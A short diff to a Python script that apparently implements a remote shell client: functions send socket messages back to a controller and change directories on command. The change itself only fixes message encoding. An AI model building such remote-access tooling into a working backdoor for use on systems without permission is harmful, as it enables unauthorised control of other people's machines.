@@ -16,7 +16,7 @@ def inbound():
             sock.close()
 
 def outbound(message):
-    response = (message).encode()
+    response = str(message).encode()
     sock.send(response)
 
 def session_handler():
@@ -40,6 +40,7 @@ def session_handler():
                 cur_dir = os.getcwd()
                 print(f"[+] Changed to {cur_dir}")
                 outbound(cur_dir)
+
             except FileNotFoundError:
                 outbound("[-] File or directory does not exist.")
                 continue
